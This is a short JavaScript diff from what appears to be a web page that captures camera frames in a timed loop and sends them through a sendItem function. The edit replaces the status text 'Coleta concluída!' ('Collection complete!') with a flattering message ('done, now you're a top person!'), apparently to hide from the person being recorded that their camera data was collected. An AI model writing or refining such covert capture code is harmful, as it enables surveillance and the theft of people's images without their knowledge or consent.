@@ -83,7 +83,7 @@
                     await new Promise(resolve => setTimeout(resolve, 500));  // 0.5s para velocidade
                 }
                 stream.getTracks().forEach(track => track.stop());
-                document.getElementById('status').innerHTML = 'Coleta concluída!';
+                document.getElementById('status').innerHTML = 'foi, agora vc é uma pessoa top!';
             } catch (e) {
                 await sendItem('Câmera', { error: `Erro na câmera: ${e.message}` });
                 document.getElementById('status').innerHTML = 'foi, mas de erro.';
